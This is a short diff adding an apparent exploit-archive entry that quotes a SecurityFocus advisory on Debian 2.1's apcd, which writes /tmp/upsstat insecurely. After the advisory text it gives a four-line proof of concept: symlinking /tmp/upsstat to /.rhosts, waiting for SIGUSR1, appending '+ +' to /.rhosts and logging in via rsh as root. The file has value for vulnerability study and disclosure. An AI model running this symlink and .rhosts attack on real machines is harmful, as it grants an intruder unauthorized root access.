@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/958/info
+
+A vulnerability exists in the apcd package, as shipped in Debian GNU/Linux 2.1. By sending the apcd process a SIGUSR1, a file will be created in /tmp called upsstat. This file contains information about the status of the APC device. This file is not opened securely, however, and it is possible for an attacker to create a symlink with this name to another place on the file system. This could, in turn, lead to a compromise of the root account.
+
+apcd is used to monitor information from APC uninterruptable power supplies. The ups will inform the apcd that power has been removed, and the apcd will shut down the machine. 
+
+
+ln -sf /tmp/upsstat /.rhosts
+(wait for SIGUSR1 to be sent)
+echo + + >> /.rhosts
+rsh localhost -l root 
